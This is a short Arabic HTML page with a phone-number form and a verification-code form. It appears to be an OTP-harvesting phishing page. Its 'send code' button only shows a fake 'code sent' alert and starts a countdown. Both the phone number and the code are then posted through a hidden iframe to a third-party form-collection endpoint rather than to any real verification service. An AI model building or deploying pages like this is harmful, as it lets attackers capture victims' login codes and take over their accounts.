<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>نموذج رقم الهاتف والكود</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f9f9f9;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      direction: rtl;
      text-align: right;
    }
    form {
      background: #fff;
      padding: 20px 30px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }
    label {
      display: block;
      margin-bottom: 6px;
      font-weight: bold;
      color: #333;
    }
    input[type="tel"],
    input[type="text"] {
      width: 100%;
      padding: 10px 12px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 5px;
      font-size: 14px;
      box-sizing: border-box;
      font-family: inherit;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      transition: background-color 0.3s ease;
      margin-bottom: 15px;
    }
    button:hover:not(:disabled) {
      background-color: #218838;
    }
    button:disabled {
      background-color: #6c757d;
      cursor: not-allowed;
    }
    #codeField {
      display: none;
    }
    #timer {
      font-weight: bold;
      margin-bottom: 15px;
      color: #555;
      text-align: center;
      display: none;
    }
  </style>
</head>
<body>
  <form id="phoneForm" action="https://formcarry.com/s/gv93b8b6cht" method="POST" target="hidden_iframe" onsubmit="return validateForm()">
    <label for="phone">رقم الهاتف:</label>
    <input type="tel" id="phone" name="phone" required placeholder="اكتب رقم هاتفك" pattern="[0-9]{10,15}" title="أدخل رقم هاتف صحيح" />

    <button type="button" id="sendCodeBtn" onclick="sendCode()">إرسال الكود</button>

    <div id="timer">يرجى الانتظار: 08:00</div>

    <div id="codeField">
      <label for="code">الكود المرسل إليك:</label>
      <input type="text" id="code" name="code" placeholder="اكتب الكود هنا" required />
    </div>

    <button type="submit">إرسال</button>
  </form>

  <iframe name="hidden_iframe" style="display:none;"></iframe>

  <script>
    let countdownInterval;

    function sendCode() {
      const phoneInput = document.getElementById('phone');
      const sendCodeBtn = document.getElementById('sendCodeBtn');
      const timerDisplay = document.getElementById('timer');
      const codeField = document.getElementById('codeField');

      if (!phoneInput.value.match(/^[0-9]{10,15}$/)) {
        alert('يرجى إدخال رقم هاتف صحيح مكون من 10 إلى 15 رقماً');
        phoneInput.focus();
        return;
      }

      // محاكاة إرسال رسالة SMS (يمكن ربط API حقيقي هنا)
      alert('تم إرسال الكود إلى رقم هاتفك.');

      // إظهار خانة الكود
      codeField.style.display = 'block';

      // تعطيل زر إرسال الكود وإظهار المؤقت
      sendCodeBtn.disabled = true;
      timerDisplay.style.display = 'block';

      let timeLeft = 480; // 8 دقائق

      function updateTimer() {
        const minutes = Math.floor(timeLeft / 60).toString().padStart(2, '0');
        const seconds = (timeLeft % 60).toString().padStart(2, '0');
        timerDisplay.textContent = `يرجى الانتظار: ${minutes}:${seconds}`;
        if (timeLeft <= 0) {
          clearInterval(countdownInterval);
          timerDisplay.style.display = 'none';
          sendCodeBtn.disabled = false;
        }
        timeLeft--;
      }

      updateTimer();
      countdownInterval = setInterval(updateTimer, 1000);
    }

    function validateForm() {
      const codeInput = document.getElementById('code');
      if (codeInput.style.display !== 'none' && codeInput.value.trim() === '') {
        alert('يرجى كتابة الكود المرسل إليك قبل الإرسال.');
        codeInput.focus();
        return false;
      }
      return true;
    }
  </script>
</body>
</html>
